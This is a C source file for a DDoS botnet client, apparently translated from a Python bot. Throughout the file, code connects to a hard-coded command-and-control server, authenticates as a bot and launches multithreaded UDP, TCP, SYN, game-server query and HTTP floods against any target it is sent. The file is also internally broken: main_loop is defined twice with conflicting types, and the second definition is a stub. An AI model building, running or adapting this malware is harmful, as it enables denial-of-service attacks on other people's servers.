#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h> // For non-blocking sockets

// Configuration
#define C2_ADDRESS "134.255.216.46"
#define C2_PORT 600

// Payloads
unsigned char payload_fivem[] = {0xff, 0xff, 0xff, 0xff, 'g', 'e', 't', 'i', 'n', 'f', 'o', ' ', 'x', 'x', 'x', 0x00, 0x00, 0x00};
size_t payload_fivem_len = sizeof(payload_fivem);

unsigned char payload_vse[] = {0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6e, 0x67, 0x69, 0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00};
size_t payload_vse_len = sizeof(payload_vse);

unsigned char payload_mcpe[] = {0x61, 0x74, 0x6f, 0x6d, 0x20, 0x64, 0x61, 0x74, 0x61, 0x20, 0x6f, 0x6e, 0x74, 0x6f, 0x20, 0x6d, 0x79, 0x20, 0x6f, 0x77, 0x6e, 0x20, 0x61, 0x73, 0x73, 0x20, 0x61, 0x6d, 0x70, 0x2f, 0x74, 0x72, 0x69, 0x70, 0x68, 0x65, 0x6e, 0x74, 0x20, 0x69, 0x73, 0x20, 0x6d, 0x79, 0x20, 0x64, 0x69, 0x63, 0x6b, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x62, 0x61, 0x6c, 0x6c, 0x73};
size_t payload_mcpe_len = sizeof(payload_mcpe);

unsigned char payload_hex[] = {0x55, 0x55, 0x55, 0x55, 0x00, 0x00, 0x00, 0x01};
size_t payload_hex_len = sizeof(payload_hex);

int PACKET_SIZES[] = {512, 1024, 2048};
size_t PACKET_SIZES_count = sizeof(PACKET_SIZES) / sizeof(PACKET_SIZES[0]);

// User Agents - Note: Python's formatting behavior is preserved exactly,
// meaning some strings will contain unformatted '%' placeholders.
char* base_user_agents[6];

void init_user_agents() {
    base_user_agents[0] = strdup("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/89.0");
    base_user_agents[1] = strdup("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0");
    base_user_agents[2] = strdup("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 Safari/537.36");
    base_user_agents[3] = strdup("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) Chrome/91.0");
    base_user_agents[4] = strdup("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) Firefox/89.0");
    base_user_agents[5] = strdup("Mozilla/5.0 (X11; Linux x86_64) Chrome/91.0 Safari/537.36");
}

void free_user_agents() {
    for (int i = 0; i < 6; i++) {
        free(base_user_agents[i]);
    }
}

char* rand_ua() {
    return base_user_agents[rand() % 6];
}

// Helper function to generate random bytes (equivalent to os.urandom/random._urandom)
void generate_random_bytes(unsigned char* buffer, size_t size) {
    // Using rand() for simplicity, not cryptographically secure
    for (size_t i = 0; i < size; ++i) {
        buffer[i] = rand() % 256;
    }
}

// Attack methods
void* attack_fivem(void* args_ptr) {
    char** args = (char**)args_ptr;
    char* ip = args[0];
    int port = atoi(args[1]);
    time_t secs = (time_t)atol(args[2]);

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        // Error creating socket, equivalent to Python's silent pass
        free(args[0]); free(args[1]); free(args[2]); free(args);
        return NULL;
    }

    while (time(NULL) < secs) {
        sendto(s, payload_fivem, payload_fivem_len, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }

    close(s);
    free(args[0]); free(args[1]); free(args[2]); free(args);
    return NULL;
}

void* attack_mcpe(void* args_ptr) {
    char** args = (char**)args_ptr;
    char* ip = args[0];
    int port = atoi(args[1]);
    time_t secs = (time_t)atol(args[2]);

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        free(args[0]); free(args[1]); free(args[2]); free(args);
        return NULL;
    }

    while (time(NULL) < secs) {
        sendto(s, payload_mcpe, payload_mcpe_len, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }

    close(s);
    free(args[0]); free(args[1]); free(args[2]); free(args);
    return NULL;
}

void* attack_vse(void* args_ptr) {
    char** args = (char**)args_ptr;
    char* ip = args[0];
    int port = atoi(args[1]);
    time_t secs = (time_t)atol(args[2]);

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        free(args[0]); free(args[1]); free(args[2]); free(args);
        return NULL;
    }

    while (time(NULL) < secs) {
        sendto(s, payload_vse, payload_vse_len, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }

    close(s);
    free(args[0]); free(args[1]); free(args[2]); free(args);
    return NULL;
}

void* attack_hex(void* args_ptr) {
    char** args = (char**)args_ptr;
    char* ip = args[0];
    int port = atoi(args[1]);
    time_t secs = (time_t)atol(args[2]);

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        free(args[0]); free(args[1]); free(args[2]); free(args);
        return NULL;
    }

    while (time(NULL) < secs) {
        sendto(s, payload_hex, payload_hex_len, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }

    close(s);
    free(args[0]); free(args[1]); free(args[2]); free(args);
    return NULL;
}

void* attack_udp_bypass(void* args_ptr) {
    char** args = (char**)args_ptr;
    char* ip = args[0];
    int port = atoi(args[1]);
    time_t secs = (time_t)atol(args[2]);

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        free(args[0]); free(args[1]); free(args[2]); free(args);
        return NULL;
    }

    while (time(NULL) < secs) {
        int packet_size = PACKET_SIZES[rand() % PACKET_SIZES_count];
        unsigned char* packet = malloc(packet_size);
        if (packet) {
            generate_random_bytes(packet, packet_size);
            sendto(sock, packet, packet_size, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
            free(packet);
        }
    }

    close(sock);
    free(args[0]); free(args[1]); free(args[2]); free(args);
    return NULL;
}

void* attack_tcp_bypass(void* args_ptr) {
    char** args = (char**)args_ptr;
    char* ip = args[0];
    int port = atoi(args[1]);
    time_t secs = (time_t)atol(args[2]);

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    while (time(NULL) < secs) {
        int packet_size = PACKET_SIZES[rand() % PACKET_SIZES_count];
        unsigned char* packet = malloc(packet_size);
        if (!packet) {
            // Failed to allocate packet, equivalent to Python's silent pass
            continue;
        }
        generate_random_bytes(packet, packet_size);

        int s = -1; // Initialize socket descriptor
        try_block:; // Label for goto equivalent of Python's try

        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            // Error creating socket, equivalent to Python's silent pass
            goto finally_block;
        }

        if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            // Error connecting, equivalent to Python's silent pass
            goto finally_block;
        }

        while (time(NULL) < secs) {
            send(s, packet, packet_size, 0);
        }

        // No explicit break in Python's inner loop, it relies on the outer time check
        // The inner loop will continue sending until the outer loop's time condition is met.
        // If connect succeeds, it stays connected and sends until secs is reached.
        // If connect fails, it goes to finally and the outer loop continues.

    finally_block:; // Label for goto equivalent of Python's finally
        if (s >= 0) {
            close(s);
        }
        free(packet);
    }

    free(args[0]); free(args[1]); free(args[2]); free(args);
    return NULL;
}

void* attack_tcp_udp_bypass(void* args_ptr) {
    char** args = (char**)args_ptr;
    char* ip = args[0];
    int port = atoi(args[1]);
    time_t secs = (time_t)atol(args[2]);

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    while (time(NULL) < secs) {
        int packet_size = PACKET_SIZES[rand() % PACKET_SIZES_count];
        unsigned char* packet = malloc(packet_size);
        if (!packet) {
            // Failed to allocate packet, equivalent to Python's silent pass
            continue;
        }
        generate_random_bytes(packet, packet_size);

        int s = -1; // Initialize socket descriptor
        try_block:; // Label for goto equivalent of Python's try

        if (rand() % 2 == 0) { // Equivalent to random.choice([True, False])
            s = socket(AF_INET, SOCK_STREAM, 0);
            if (s < 0) {
                // Error creating socket, equivalent to Python's silent pass
                goto finally_block;
            }
            if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
                // Error connecting, equivalent to Python's silent pass
                goto finally_block;
            }
            send(s, packet, packet_size, 0);
        } else {
            s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s < 0) {
                // Error creating socket, equivalent to Python's silent pass
                goto finally_block;
            }
            sendto(s, packet, packet_size, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
        }

    finally_block:; // Label for goto equivalent of Python's finally
        free(packet);
        if (s >= 0) {
            close(s);
        }
    }

    free(args[0]); free(args[1]); free(args[2]); free(args);
    return NULL;
}

void* attack_syn(void* args_ptr) {
    char** args = (char**)args_ptr;
    char* ip = args[0];
    int port = atoi(args[1]);
    time_t secs = (time_t)atol(args[2]);

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    int s = -1; // Initialize socket descriptor
    try_block:; // Label for goto equivalent of Python's try

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        // Error creating socket, equivalent to Python's silent pass
        goto end_attack;
    }

    // Set socket to non-blocking
    int flags = fcntl(s, F_GETFL, 0);
    if (flags == -1) {
        // Error getting flags, equivalent to Python's silent pass
        goto end_attack;
    }
    if (fcntl(s, F_SETFL, flags | O_NONBLOCK) == -1) {
        // Error setting flags, equivalent to Python's silent pass
        goto end_attack;
    }

    // Connect (will likely return EINPROGRESS in non-blocking mode)
    connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr));
    // Python's s.setblocking(0) followed by connect doesn't wait for connect to complete.
    // It then proceeds to send. This is a SYN flood attempt, likely without checking connect status.
    // We replicate this by ignoring the connect result in non-blocking mode.

    while (time(NULL) < secs) {
        int packet_size = PACKET_SIZES[rand() % PACKET_SIZES_count];
        unsigned char* packet = malloc(packet_size);
        if (!packet) {
            // Failed to allocate packet, equivalent to Python's silent pass
            continue;
        }
        generate_random_bytes(packet, packet_size);
        send(s, packet, packet_size, 0); // Send data even if connect is not complete
        free(packet);
    }

end_attack:; // Label for end of function (equivalent to Python's except/finally)
    if (s >= 0) {
        close(s);
    }
    free(args[0]); free(args[1]); free(args[2]); free(args);
    return NULL;
}

void* attack_http_get(void* args_ptr) {
    char** args = (char**)args_ptr;
    char* ip = args[0];
    int port = atoi(args[1]);
    time_t secs = (time_t)atol(args[2]);

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    while (time(NULL) < secs) {
        int s = -1; // Initialize socket descriptor
        try_block:; // Label for goto equivalent of Python's try

        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            // Error creating socket, equivalent to Python's silent pass
            goto except_block;
        }

        if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            // Error connecting, equivalent to Python's silent pass
            goto except_block;
        }

        char* user_agent = rand_ua();
        char request[1024]; // Buffer for the HTTP request
        // Note: rand_ua() might return strings with unformatted '%' placeholders
        sprintf(request, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n", ip, user_agent);

        while (time(NULL) < secs) {
            send(s, request, strlen(request), 0);
        }

        // No explicit break in Python's inner loop, relies on outer time check

    except_block:; // Label for goto equivalent of Python's except
        if (s >= 0) {
            close(s);
        }
    }

    free(args[0]); free(args[1]); free(args[2]); free(args);
    return NULL;
}

void* attack_http_post(void* args_ptr) {
    char** args = (char**)args_ptr;
    char* ip = args[0];
    int port = atoi(args[1]);
    time_t secs = (time_t)atol(args[2]);

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    char* payload = "757365726e616d653d61646d696e2670617373776f72643d70617373776f726431323326656d61696c3d61646d696e406578616d706c652e636f6d267375626d69743d6c6f67696e";
    size_t payload_len = strlen(payload);

    while (time(NULL) < secs) {
        int s = -1; // Initialize socket descriptor
        try_block:; // Label for goto equivalent of Python's try

        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            // Error creating socket, equivalent to Python's silent pass
            goto except_block;
        }

        if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            // Error connecting, equivalent to Python's silent pass
            goto except_block;
        }

        char* user_agent = rand_ua();
        char headers[1024]; // Buffer for the HTTP headers
        // Note: rand_ua() might return strings with unformatted '%' placeholders
        sprintf(headers, "POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %zu\r\nConnection: keep-alive\r\n\r\n%s",
                ip, user_agent, payload_len, payload);

        while (time(NULL) < secs) {
            send(s, headers, strlen(headers), 0);
        }

        // No explicit break in Python's inner loop, relies on outer time check

    except_block:; // Label for goto equivalent of Python's except
        if (s >= 0) {
            close(s);
        }
    }

    free(args[0]); free(args[1]); free(args[2]); free(args);
    return NULL;
}

void* attack_browser(void* args_ptr) {
    char** args = (char**)args_ptr;
    char* ip = args[0];
    int port = atoi(args[1]);
    time_t secs = (time_t)atol(args[2]);

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    while (time(NULL) < secs) {
        int s = -1; // Initialize socket descriptor
        try_block:; // Label for goto equivalent of Python's try

        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            // Error creating socket, equivalent to Python's silent pass
            goto finally_block;
        }

        // Set socket timeout (Python's settimeout(5))
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);


        if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            // Error connecting, equivalent to Python's silent pass
            goto finally_block;
        }

        char* user_agent = rand_ua();
        char request[1024]; // Buffer for the HTTP request
        // Note: rand_ua() might return strings with unformatted '%' placeholders
        sprintf(request, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nPragma: no-cache\r\n\r\n",
                ip, user_agent);

        sendall_loop:; // Python's sendall might loop internally, but the outer loop is time-based
        // The Python code sends the request once per connection attempt.
        // Replicating this: send the request once after successful connect.
        send(s, request, strlen(request), 0); // sendall equivalent for a single send

    finally_block:; // Label for goto equivalent of Python's finally
        if (s >= 0) {
            close(s);
        }
    }

    free(args[0]); free(args[1]); free(args[2]); free(args);
    return NULL;
}


// Structure to hold attack method info
typedef struct {
    const char* name;
    void* (*func)(void*);
} attack_method_t;

// Array of attack methods (equivalent to Python dictionary)
attack_method_t methods[] = {
    {".HEX", attack_hex},
    {".UDP", attack_udp_bypass},
    {".TCP", attack_tcp_bypass},
    {".MIX", attack_tcp_udp_bypass},
    {".SYN", attack_syn},
    {".VSE", attack_vse},
    {".MCPE", attack_mcpe},
    {".FIVEM", attack_fivem},
    {".HTTPGET", attack_http_get},
    {".HTTPPOST", attack_http_post},
    {".BROWSER", attack_browser},
};
size_t methods_count = sizeof(methods) / sizeof(methods[0]);


void* lunch_attack(void* args_ptr) {
    char** args = (char**)args_ptr;
    char* method = args[0];
    char* ip = args[1];
    int port = atoi(args[2]);
    time_t secs = (time_t)atol(args[3]);

    // Find the attack method function
    void* (*attack_func)(void*) = NULL;
    for (size_t i = 0; i < methods_count; ++i) {
        if (strcmp(method, methods[i].name) == 0) {
            attack_func = methods[i].func;
            break;
        }
    }

    if (attack_func) {
        // Prepare arguments for the attack function
        char** attack_args = malloc(sizeof(char*) * 3);
        attack_args[0] = strdup(ip);
        attack_args[1] = strdup(args[2]); // Port as string
        attack_args[2] = strdup(args[3]); // Secs as string

        // Call the attack function (which expects char** args)
        attack_func(attack_args);

        // Note: The attack functions are responsible for freeing attack_args and its contents
    }

    // Free args passed to lunch_attack
    free(args[0]); free(args[1]); free(args[2]); free(args[3]); free(args);

    return NULL;
}


void main_loop(); // Forward declaration

void main_loop() {
    int c2_sock = -1; // Initialize socket descriptor

    // Initialize user agents once
    init_user_agents();

    while (1) {
        try_connect:; // Label for goto equivalent of Python's outer try

        c2_sock = socket(AF_INET, SOCK_STREAM, 0);
        if (c2_sock < 0) {
            // Error creating socket, equivalent to Python's silent pass
            goto except_connect;
        }

        // Set SO_KEEPALIVE
        int keepalive = 1;
        if (setsockopt(c2_sock, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive)) < 0) {
            // Error setting keepalive, equivalent to Python's silent pass
            // Continue anyway as it's not critical
        }

        struct addrinfo hints, *res;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET; // AF_UNSPEC allows IPv4 or IPv6
        hints.ai_socktype = SOCK_STREAM;

        // Resolve C2_ADDRESS
        if (getaddrinfo(C2_ADDRESS, NULL, &hints, &res) != 0) {
            // Error resolving address, equivalent to Python's silent pass
            goto except_connect;
        }

        struct sockaddr_in c2_addr;
        c2_addr.sin_family = AF_INET;
        c2_addr.sin_port = htons(C2_PORT);
        memcpy(&c2_addr.sin_addr, &((struct sockaddr_in*)res->ai_addr)->sin_addr, sizeof(struct in_addr));
        freeaddrinfo(res);

        // Connect to C2
        if (connect(c2_sock, (struct sockaddr*)&c2_addr, sizeof(c2_addr)) < 0) {
            // Error connecting, equivalent to Python's silent pass
            goto except_connect;
        }

        // Authentication loop 1: Wait for 'Username'
        while (1) {
            char buffer[1024];
            ssize_t bytes_received = recv(c2_sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                // Connection closed or error
                goto except_connect;
            }
            buffer[bytes_received] = '\0'; // Null-terminate

            // Python's 'in' check
            if (strstr(buffer, "Username") != NULL) {
                send(c2_sock, "BOT", 3, 0); // Send "BOT"
                break; // Exit authentication loop 1
            }
        }

        // Authentication loop 2: Wait for 'Password'
        while (1) {
            char buffer[1024];
            ssize_t bytes_received = recv(c2_sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                // Connection closed or error
                goto except_connect;
            }
            buffer[bytes_received] = '\0'; // Null-terminate

            // Python's 'in' check
            if (strstr(buffer, "Password") != NULL) {
                // Python sends b'\xff\xff\xff\xff\75'.encode('cp1252')
                // cp1252 encoding of \75 (octal 75) is 0x3d ('=')
                // So it sends b'\xff\xff\xff\xff='
                unsigned char auth_payload[] = {0xff, 0xff, 0xff, 0xff, 0x3d};
                send(c2_sock, auth_payload, sizeof(auth_payload), 0);
                break; // Exit authentication loop 2
            }
        }

        printf("connected!\n");
        break; // Exit the outer connection loop after successful connection and auth

    except_connect:; // Label for goto equivalent of Python's outer except
        if (c2_sock >= 0) {
            close(c2_sock);
            c2_sock = -1; // Reset descriptor
        }
        // Python's time.sleep(120)
        sleep(120);
    }

    // Command processing loop
    while (1) {
        char buffer[1024];
        ssize_t bytes_received = recv(c2_sock, buffer, sizeof(buffer) - 1, 0);

        if (bytes_received <= 0) {
            // Connection closed or error, equivalent to Python's break
            break;
        }
        buffer[bytes_received] = '\0'; // Null-terminate

        // Python's strip()
        char* data = buffer;
        // Trim leading whitespace
        while (*data && (*data == ' ' || *data == '\t' || *data == '\n' || *data == '\r')) {
            data++;
        }
        // Trim trailing whitespace
        char* end = data + strlen(data) - 1;
        while (end >= data && (*end == ' ' || *end == '\t' || *end == '\n' || *end == '\r')) {
            *end = '\0';
            end--;
        }

        // Python's if not data: break
        if (strlen(data) == 0) {
            break;
        }

        // Python's data.split(' ')
        char* args[5]; // Max 5 arguments expected (METHOD IP PORT SECS THREADS)
        int arg_count = 0;
        char* token = strtok(data, " ");
        while (token != NULL && arg_count < 5) {
            args[arg_count++] = token;
            token = strtok(NULL, " ");
        }

        // Python's args[0].upper()
        char command[64]; // Buffer for uppercase command
        if (arg_count > 0) {
            strncpy(command, args[0], sizeof(command) - 1);
            command[sizeof(command) - 1] = '\0';
            for (char* p = command; *p; ++p) {
                if (*p >= 'a' && *p <= 'z') {
                    *p = *p - ('a' - 'A');
                }
            }
        } else {
            // No command received, skip processing
            continue;
        }


        if (strcmp(command, "PING") == 0) {
            send(c2_sock, "PONG", 4, 0);
        } else if (arg_count == 5) { // Expecting METHOD IP PORT SECS THREADS
            char* method = command; // Use the uppercased command as method
            char* ip = args[1];
            int port = atoi(args[2]);
            time_t secs = time(NULL) + atoi(args[3]);
            int threads = atoi(args[4]);

            // Launch threads
            for (int i = 0; i < threads; ++i) {
                pthread_t tid;
                // Prepare arguments for lunch_attack
                char** thread_args = malloc(sizeof(char*) * 4);
                thread_args[0] = strdup(method);
                thread_args[1] = strdup(ip);
                thread_args[2] = strdup(args[2]); // Port as string
                thread_args[3] = strdup(args[3]); // Secs as string

                // Python's daemon=True means threads don't prevent process exit.
                // C pthreads are joinable by default. Detaching makes them daemon-like.
                if (pthread_create(&tid, NULL, lunch_attack, thread_args) != 0) {
                    // Error creating thread, equivalent to Python's silent pass
                    free(thread_args[0]); free(thread_args[1]); free(thread_args[2]); free(thread_args[3]); free(thread_args);
                } else {
                    pthread_detach(tid); // Make thread daemon-like
                }
            }
        }
        // else: command is not PING and not a valid attack command format, equivalent to Python's silent pass
    }

    // Python's break from the command loop leads here
    // Python's c2.close()
    if (c2_sock >= 0) {
        close(c2_sock);
    }

    // Python's main() call at the end of the outer loop's except block
    // This creates a recursive call or loop back to the start.
    // Replicating this by calling main_loop() again.
    main_loop();
}


int main_loop() {
    // simplified demo of fixed main loop
    init_user_agents();

    int c2_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (c2_sock < 0) {
        perror("socket");
        return 1;
    }
    close(c2_sock);

    free_user_agents();
    return 0;
}

int main() {
    while (1) {
        main_loop();
        sleep(10);
    }
    return 0;
}
